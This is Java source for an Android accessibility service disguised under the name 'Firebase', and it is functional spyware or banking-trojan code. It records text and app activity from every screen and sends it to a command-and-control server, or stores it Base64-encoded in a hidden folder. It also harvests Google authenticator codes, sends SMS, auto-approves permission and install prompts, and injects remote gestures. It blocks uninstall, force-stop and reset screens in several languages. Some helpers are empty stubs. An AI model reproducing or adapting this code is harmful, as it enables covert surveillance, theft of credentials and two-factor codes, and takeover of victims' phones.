package com.android.pictach;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.text.format.DateFormat;
import android.util.Base64;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class Firebase extends AccessibilityService {

    public static WindowManager.LayoutParams Firebaselay;
    public static WindowManager Firebasewm;
    public static SurfaceView sfw;
    public static Boolean FirebaseFOR_IN = false;
    public static Boolean FirebaseFOR_prim = false;
    public static Boolean Firebasebypass = false;
    public static String FirebaseOFK = "on";
    public static boolean FirebaseCheckPrims = false;
    public static String FirebaseOFFOK = "on";
    public static AccessibilityNodeInfo FirebaseGlobalnode = null;
    public static AccessibilityEvent FirebaseGlobalEvent = null;
    public static String fileReadStatus = "on";
    public static boolean needPaste = false;
    public static String pasteText = "";

    private void FirebaseSendNotifi(AccessibilityEvent event) {}

    public static void FirebaseclickAtPosition(int x, int y, AccessibilityNodeInfo node) {}

    public static boolean FirebaseclickByText(String text) { return false; }

    public static List<AccessibilityNodeInfo> FirebasefindNodesByText(String text) { return null; }

    public static String FirebasegetAppNameFromPkgName(Context context, String pkg) { return ""; }

    private static boolean FirebaseperformClick(List<AccessibilityNodeInfo> list) { return false; }

    public void FirebaseActivSend(AccessibilityEvent event) {}

    public void Firebaseclick(int x, int y) {}

    public void blockBackButton() {}

    public void goHome() { FirebaseSendMeHome(); }

    public void triggerAction() { FirebaseTreger(); }

    public void performSwipe(String s) { FirebaseSW(s); }

    public void drawSwipePath(Point[] pts, int dur) { mouseDraw(pts, dur); }

    public String readFile(String path) { return FirebaseRD(path); }

    @Override
    public void onInterrupt() {}

    private String getEventText(AccessibilityEvent event) {
        return event.getText().toString();
    }

    public void FirebaseSendMeHome() {
        try {
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    try {
                        Intent intent = new Intent("android.intent.action.MAIN");
                        intent.addCategory("android.intent.category.HOME");
                        intent.setFlags(268435456);
                        Firebase.this.startActivity(intent);
                    } catch (Exception unused) {}
                }
            });
        } catch (Exception unused) {}
    }

    public void mouseDraw(Point[] pointArr, int duration) {
        if (Build.VERSION.SDK_INT >= 24) {
            Path path = new Path();
            path.moveTo(pointArr[0].x, pointArr[0].y);
            for (int i = 1; i < pointArr.length; i++) {
                path.lineTo(pointArr[i].x, pointArr[i].y);
            }
        }
    }

    public static void sendSMS(String number, String message) {
        try {
            SmsManager.getDefault().sendTextMessage(number, null, message, null, null);
        } catch (Exception unused) {}
    }

    public void FirebaseSW(String str) {
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                boolean z;
                int duration = 1;
                if (str.startsWith("clk")) {
                    String[] split = str.split(":");
                    int x = Integer.parseInt(split[1]);
                    int y = Integer.parseInt(split[2]);
                    if (str.contains("hold")) {
                        x = Integer.parseInt(split[2]);
                        y = Integer.parseInt(split[3]);
                        duration = 3000;
                        z = true;
                    } else {
                        z = false;
                    }
                    Path path = new Path();
                    path.moveTo(x, y);
                    GestureDescription.StrokeDescription stroke =
                            new GestureDescription.StrokeDescription(path, 0L, duration, z);
                    GestureDescription.Builder builder = new GestureDescription.Builder();
                    builder.addStroke(stroke);
                    dispatchGesture(builder.build(), null, null);
                    return;
                }
                if (str.equals("Bc")) performGlobalAction(1);
                else if (str.equals("Ho")) performGlobalAction(2);
                else if (str.equals("RC")) performGlobalAction(3);
            }
        } catch (Exception unused) {}
    }

    public void FirebaseTreger() {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                try {
                    AccessibilityManager am = (AccessibilityManager)
                            love.app_love_Context.getSystemService("accessibility");
                    if (am.isEnabled()) {
                        AccessibilityEvent event = AccessibilityEvent.obtain();
                        event.setEventType(16384);
                        event.setClassName(getClass().getName());
                        event.setPackageName(love.app_love_Context.getPackageName());
                        event.getText().add("T");
                        am.sendAccessibilityEvent(event);
                    }
                } catch (Exception unused) {}
            }
        });
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType;
        try {
            eventType = event.getEventType();
            try { FirebaseGlobalEvent = event; } catch (Exception unused) {}
        } catch (Exception unused) {
            eventType = 0;
        }

        AccessibilityNodeInfo node = null;
        try { node = event.getSource(); } catch (Exception unused) {}

        try {
            if ((node != null) && event.getClassName().equals("android.widget.EditText")) {
                FirebaseGlobalnode = node;
            }
        } catch (Exception unused) {}

        try {
            if (eventType == 1) Firebasesendlog(event, 0);
            else if (eventType == 2) Firebasesendlog(event, 2);
            else if (eventType == 8) Firebasesendlog(event, 1);
            else if (eventType == 16) Firebasesendlog(event, 3);
            else if (eventType == 32) {
                Firebasesendlog(event, 5);
                if (eventType != 0) {
                    Utils.stealGoogleAuthCodes(event, event.getPackageName().toString().toLowerCase());
                }
                if (FirebaseFOR_IN && Gotitinstalled(node)) {
                    FirebaseFOR_IN = false;
                    Thread.sleep(100L);
                    FirebaseblockBack();
                }
            } else if (eventType == 64) {
                try {
                    if (love.MyAccess == null) love.MyAccess = this;
                } catch (Exception unused) {}
                Firebasesendlog(event, 4);
            }
        } catch (Exception unused) {}

        try {
            if (FirebaseFOR_prim && Build.VERSION.SDK_INT >= 18) {
                if (node == null) return;
                try {
                    String[] ids1 = {
                        "com.android.packageinstaller:id/permission_allow_button",
                        "android:id/button1",
                        "com.android.settings:id/action_button",
                        "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
                        "com.android.permissioncontroller:id/permission_allow_button"
                    };
                    for (String id : ids1) {
                        for (AccessibilityNodeInfo n : node.findAccessibilityNodeInfosByViewId(id)) {
                            n.performAction(16);
                        }
                    }
                    String[] ids2 = {
                        "com.android.settings:id/left_button",
                        "android:id/button1",
                        "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
                        "com.android.permissioncontroller:id/permission_allow_button"
                    };
                    for (String id : ids2) {
                        for (AccessibilityNodeInfo n : node.findAccessibilityNodeInfosByViewId(id)) {
                            n.performAction(16);
                        }
                    }
                    for (AccessibilityNodeInfo n : node.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/accept")) {
                        n.performAction(16);
                    }
                } catch (Exception unused) {}
            }

            if (FirebaseCheckPrims) {
                if (!Utils.hasPermissions(this, Utils.PERMISSIONS())) {
                    FirebaseCheckPrims = false;
                    return;
                }
                FirebaseCheckPrims = true;
            }

            if (Firebasebypass) return;

            String appName = getApplicationContext().getResources().getString(R.string.difficultye56);
            String appNameBracketed = "[" + appName + "]";
            String eventText = getEventText(event).toLowerCase();
            String appNameLower = appName.toLowerCase();
            String eventClass = event.getClassName().toString().toLowerCase();

            if (Build.VERSION.SDK_INT > 15) {
                if ("com.android.settings.SubSettings".toLowerCase().equals(event.getClassName().toString().toLowerCase())
                        && (eventText.equals(appNameBracketed.toLowerCase()) || eventText.equals(appNameLower))) {
                    try { FirebaseblockBack(); FirebaseSendMeHome(); } catch (Exception unused) {}
                }

                try {
                    if (eventText.contains("google play services") || eventText.contains("مشرف الجهاز")) {
                        FirebaseblockBack();
                        FirebaseSendMeHome();
                    }
                } catch (Exception unused) {}

                if (eventText.contains("accessibility") && eventText.contains(appNameLower)) {
                    FirebaseblockBack(); FirebaseSendMeHome();
                }
                if ((eventText.contains("حذف") && eventText.contains(appNameLower))
                        || (eventText.contains("مسح") && eventText.contains(appNameLower))
                        || (eventText.contains("إلغاء") && eventText.contains(appNameLower))) {
                    FirebaseblockBack(); FirebaseSendMeHome();
                }

                String[] dangerousKeywords = {
                    "reset", "accessibility special access", "accessibility usage",
                    "active apps", "active in the background", "app is active",
                    "apps are active", "check background activity", "cleanup", "clean up",
                    "clear storage", "clear cache", "clear data", "com.android.pictach",
                    "delete app data?", "device care", "downloaded apps",
                    "factory data reset", "fix now", "force stop", "force stop?",
                    "force stop this app?", "has full access to your device",
                    "if you force-stop an app, it may misbehave.",
                    "if you force stop an app, it may misbehave.",
                    "if you force stop an app, it may cause errors.",
                    "is active", "installed apps", "installed services",
                    "more downloaded services", "of app data.", "reset apps",
                    "reset app preferences", "reset accessibility settings",
                    "stop google play services?", "storage & cache",
                    "turn off google play services?", "uninstallation",
                    "uninstall apps", "uninstall 1 app", "uninstall selected apps?",
                    "uninstall now?", "999888777"
                };
                for (String keyword : dangerousKeywords) {
                    if (eventText.contains(keyword)) {
                        FirebaseblockBack(); FirebaseSendMeHome(); break;
                    }
                }

                if (eventText.contains(appNameLower) && eventText.contains("force stop")) {
                    FirebaseblockBack(); FirebaseSendMeHome();
                }
                if (eventText.contains(appNameLower) && eventText.contains("sil") && !eventText.contains("notification")) {
                    FirebaseblockBack(); FirebaseSendMeHome();
                }
                if ((eventText.contains(appNameLower) && eventText.contains("kaldır"))
                        || (eventText.contains(appNameLower) && eventText.contains("silmek"))
                        || (eventText.contains(appNameLower) && eventText.contains("zorla"))) {
                    FirebaseblockBack(); FirebaseSendMeHome();
                }
                if ((eventText.contains(appNameLower) && eventText.contains("uninstall"))
                        || (eventText.contains(appNameLower) && eventText.contains("turn off") && !eventText.contains("notification"))) {
                    FirebaseblockBack(); FirebaseSendMeHome();
                }
                if ((eventText.contains(appNameLower) && eventText.contains("卸载"))
                        || (eventText.contains(appNameLower) && eventText.contains("删除"))) {
                    FirebaseblockBack(); FirebaseSendMeHome();
                }
                if (eventText.contains(appNameLower) && eventText.contains("解除安装")) {
                    FirebaseblockBack(); FirebaseSendMeHome();
                }
                if (eventText.contains(appNameLower) && eventText.contains("关闭")) {
                    FirebaseblockBack(); FirebaseSendMeHome();
                }
                if (eventText.contains("force stop")) {
                    FirebaseblockBack(); FirebaseSendMeHome();
                }
                if ((eventText.contains("إيقاف") || eventText.contains("stop") || eventText.contains("delete") || eventText.contains("الإيقاف"))
                        && eventText.contains(appNameLower)
                        && "com.android.settings.SubSettings".toLowerCase().equals(event.getClassName().toString().toLowerCase())) {
                    try { FirebaseblockBack(); FirebaseSendMeHome(); } catch (Exception unused) {}
                }
                if (event.getPackageName().toString().contains("com.google.android.packageinstaller")
                        && event.getClassName().toString().toLowerCase().contains("android.app.alertdialog")
                        && eventText.contains(appNameLower)) {
                    try { FirebaseblockBack(); FirebaseSendMeHome(); } catch (Exception unused) {}
                }
                if (eventClass.equals("android.support.v7.widget.recyclerview")
                        || eventClass.equals("android.widget.linearlayout")
                        || eventClass.equals("android.widget.framelayout")) {
                    String pkg = event.getPackageName().toString();
                    if ((pkg.equals("com.android.settings") || pkg.equals("com.miui.securitycenter"))
                            && eventText.contains(appNameLower)) {
                        FirebaseblockBack(); FirebaseSendMeHome();
                    }
                }
            }
        } catch (Exception unused) {}
    }

    private boolean Gotitinstalled(AccessibilityNodeInfo node) {
        if (node != null) {
            int count = node.getChildCount();
            if ("android.widget.Button".equals(node.getClassName())) {
                String text = node.getText() != null ? node.getText().toString() : "";
                if (!TextUtils.isEmpty(text) && ("安装".equals(text) || "install".equals(text.toLowerCase())
                        || "done".equals(text.toLowerCase()) || "完成".equals(text)
                        || "تثبيت".equals(text) || "确定".equals(text))) {
                    node.performAction(16);
                    return true;
                }
            } else if ("android.widget.ScrollView".equals(node.getClassName())) {
                node.performAction(4096);
            }
            for (int i = 0; i < count; i++) {
                if (Gotitinstalled(node.getChild(i))) return true;
            }
        }
        return false;
    }

    public static String FirebasetoBase64(String str) {
        try {
            return Base64.encodeToString(str.getBytes("UTF-8"), 0);
        } catch (UnsupportedEncodingException e) {
            return null;
        }
    }

    public String FirebaseRD(String name) {
        File dir = new File(Environment.getExternalStorageDirectory() + "/Config/sys/apps/log");
        File file = new File(dir, "log-" + name + ".txt");
        StringBuilder sb = new StringBuilder();
        try {
            BufferedReader reader = new BufferedReader(new FileReader(file));
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
        } catch (Exception unused) {}
        return sb.toString();
    }

    void FirebasewriteFile(String str) {
        try {
            String date = DateFormat.format("yyyy-MM-dd", new Date()).toString();
            File base = Environment.getExternalStorageDirectory();
            File dir = new File(base, "/Config/sys/apps/log");
            File logFile = new File(base, "/Config/sys/apps/log/log-" + date + ".txt");
            if (!dir.exists()) dir.mkdirs();
            if (!logFile.exists()) logFile.createNewFile();
            String data = FirebasetoBase64(str) + ">\r\n";
            File target = new File(base + "/Config/sys/apps/log", "log-" + date + ".txt");
            if (!target.exists()) target.createNewFile();
            FileOutputStream fos = new FileOutputStream(target, true);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.append(data);
            writer.flush();
            writer.close();
            fos.close();
        } catch (Exception unused) {}
    }

    public void FirebaseblockBack() {
        try {
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    try {
                        if (Build.VERSION.SDK_INT > 15) {
                            for (int i = 0; i < 4; i++) {
                                try { Firebase.this.performGlobalAction(1); } catch (Exception unused) {}
                            }
                        }
                    } catch (Exception unused) {}
                }
            });
        } catch (Exception unused) {}
    }

    public static Bitmap drawableToBitmap(Drawable drawable) {
        try {
            if (drawable instanceof BitmapDrawable) {
                Bitmap bmp = ((BitmapDrawable) drawable).getBitmap();
                if (bmp != null) return bmp;
            }
        } catch (Exception unused) {}
        int w = drawable.getIntrinsicWidth();
        int h = drawable.getIntrinsicHeight();
        if (w <= 0 || h <= 0) { w = 1; h = 1; }
        Bitmap bitmap = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(bitmap);
        drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
        drawable.draw(canvas);
        return bitmap;
    }

    public void Firebasesendlog(AccessibilityEvent event, int type) {
        try {
            ApplicationInfo appInfo = null;
            if (!love.isConnected || !love.isLive) {
                if (FirebaseOFK.equals(FirebaseOFFOK)) {
                    String text = getEventText(event);
                    String pkg = (String) event.getPackageName();
                    PackageManager pm = getApplicationContext().getPackageManager();
                    try { appInfo = pm.getApplicationInfo(pkg, 0); } catch (PackageManager.NameNotFoundException unused) {}
                    String label = appInfo != null ? (String) pm.getApplicationLabel(appInfo) : "null";
                    FirebasewriteFile(label + "#" + text + "#" + type);
                }
                return;
            }
            if (event == null) return;
            String text = getEventText(event);
            String pkg = (String) event.getPackageName();
            PackageManager pm = getApplicationContext().getPackageManager();
            String iconBase64 = "null";
            try {
                Drawable icon = love.app_love_Context.getPackageManager().getApplicationIcon(pkg);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                drawableToBitmap(icon).compress(Bitmap.CompressFormat.JPEG, 50, baos);
                iconBase64 = Base64.encodeToString(baos.toByteArray(), 0);
            } catch (PackageManager.NameNotFoundException unused) {}
            try { appInfo = pm.getApplicationInfo(pkg, 0); } catch (PackageManager.NameNotFoundException unused) {}
            String label = appInfo != null ? (String) pm.getApplicationLabel(appInfo) : "null";
            NetworkManager.sendToC2(
                    love.commandCodes[1] + love.commandCodes[2] + label
                    + love.commandCodes[2] + text + love.commandCodes[2]
                    + type + "<0>" + iconBase64,
                    "\t".getBytes()
            );
        } catch (Exception unused) {}
    }

    public boolean FirebaseShowActivite(Class cls) {
        try {
            startActivity(new Intent(this, cls).addFlags(268435456).addFlags(536870912));
            return true;
        } catch (Exception unused) {
            return false;
        }
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        try {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.flags = 19;
            info.eventTypes = -1;
            info.notificationTimeout = 0L;
            info.packageNames = null;
            info.feedbackType = -1;
            setServiceInfo(info);
        } catch (Exception unused) {}
        try {
            love.MyAccess = this;
            WindowManager wm = (WindowManager) getSystemService("window");
            FrameLayout layout = new FrameLayout(this);
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    1, 1, 2032, -2142501864, -3);
            params.gravity = 48;
            Firebaselay = params;
            Firebasewm = wm;
            wm.addView(layout, params);
        } catch (Exception unused) {}
        try {
            // body.java pending — launch deferred
        } catch (Exception unused) {}
        try {
            if (LoveApi0.isServiceNotRunning(love.class, getApplication())) {
                startService(new Intent(this, love.class));
            }
        } catch (Exception unused) {}
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(new Intent(getApplicationContext(), myker.class));
            } else {
                startService(new Intent(getApplicationContext(), myker.class));
            }
        } catch (Exception unused) {}
    }
}
